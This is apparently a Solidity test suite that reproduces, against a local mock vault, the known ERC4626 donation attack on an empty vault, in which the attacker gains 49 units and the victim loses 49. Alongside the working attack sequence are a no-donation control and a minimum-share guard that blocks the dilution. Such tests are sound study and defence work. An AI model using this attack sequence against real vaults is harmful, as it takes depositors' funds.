// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC20} from "../src/tokens/ERC20.sol";
import {ERC4626} from "../src/tokens/ERC4626.sol";

/// @notice Local simplified underlying asset; no real token or external RPC.
contract D24JMockAsset is ERC20 {
    constructor() ERC20("Local test unit", "UNIT", 18) {}
    function allocate(address recipient, uint256 amount) external {
        _mint(recipient, amount);
    }
}

/// @notice Minimal implementation of the unmodified Solmate ERC4626 base.
/// We supply the abstract asset observer, without changing its conversions.
contract D24JMinimalVault is ERC4626 {
    constructor(ERC20 asset_) ERC4626(asset_, "Local vault", "LV") {}
    function totalAssets() public view override returns (uint256) {
        return asset.balanceOf(address(this));
    }
}

contract D24JLocalActor {
    D24JMockAsset public immutable token;
    D24JMinimalVault public immutable vault;

    constructor(D24JMockAsset token_, D24JMinimalVault vault_) {
        token=token_;
        vault=vault_;
    }

    function enter(uint256 amount) external returns (uint256) {
        token.approve(address(vault),amount);
        return vault.deposit(amount,address(this));
    }
    function donate(uint256 amount) external {
        token.transfer(address(vault),amount);
    }
    function exitAll() external returns (uint256) {
        return vault.redeem(vault.balanceOf(address(this)),address(this),address(this));
    }
    function guardedEnter(uint256 amount,uint256 minimumShares) external returns (uint256) {
        require(vault.previewDeposit(amount)>=minimumShares,"INSUFFICIENT_EXPECTED_SHARES");
        token.approve(address(vault),amount);
        uint256 result=vault.deposit(amount,address(this));
        require(result>=minimumShares,"INSUFFICIENT_ACTUAL_SHARES");
        return result;
    }
}

/// @notice Independently specified user-value oracle. It is intentionally
/// conditional on an *unprotected* empty ERC4626 vault and direct donation;
/// it is not a finding of an unknown exploit or a production deployment.
contract D24JValueInfluenceTest {
    D24JMockAsset internal token;
    D24JMinimalVault internal vault;
    D24JLocalActor internal attacker;
    D24JLocalActor internal victim;

    function setUp() public {
        token=new D24JMockAsset();
        vault=new D24JMinimalVault(token);
        attacker=new D24JLocalActor(token,vault);
        victim=new D24JLocalActor(token,vault);
        token.allocate(address(attacker),101);
        token.allocate(address(victim),199);
    }

    function _prepareDonation() internal {
        uint256 mintedShares=attacker.enter(1);
        require(mintedShares==1,"invalid initial share control");
        attacker.donate(100);
        require(vault.totalAssets()==101 && vault.totalSupply()==1,
                "control: donation must change assets without new shares");
    }

    function test_native_donation_changes_price_without_minting_shares() public {
        _prepareDonation();
        require(vault.convertToShares(199)==1,"source quote did not exhibit dilution");
        require(vault.previewDeposit(199)==1,"preview mismatch");
    }

    function test_native_unprotected_victim_loss_and_attacker_profit() public {
        _prepareDonation();
        uint256 victimShares=victim.enter(199);
        require(victimShares==1,"victim shares unexpectedly protected");
        uint256 attackerProceeds=attacker.exitAll();
        uint256 victimProceeds=victim.exitAll();
        require(attackerProceeds==150 && victimProceeds==150,"wrong independent cashflow observation");
        // Attacker spent 101 units, recovers 150; victim spent 199, recovers 150.
        require(attackerProceeds-101==49,"attacker profit control failed");
        require(199-victimProceeds==49,"victim loss control failed");
        require(token.balanceOf(address(vault))==0,"tokens not fully redeemed");
        require(token.totalSupply()==300,"asset conservation is a separate control");
    }

    function test_native_undonated_control_has_no_victim_loss() public {
        attacker.enter(1);
        uint256 shares=victim.enter(199);
        require(shares==199,"undonated counterfactual unexpectedly diluted");
        uint256 victimProceeds=victim.exitAll();
        require(victimProceeds==199,"counterfactual victim loss");
    }

    function test_native_minimum_share_guard_refuses_dilution() public {
        _prepareDonation();
        (bool ok,)=address(victim).call(abi.encodeWithSelector(
            D24JLocalActor.guardedEnter.selector,199,199));
        require(!ok,"negative control: guarded deposit incorrectly succeeded");
        require(token.balanceOf(address(victim))==199,"guard did not preserve victim assets");
        require(vault.totalAssets()==101 && vault.totalSupply()==1,
                "guarded rejection must not change vault state");
    }
}
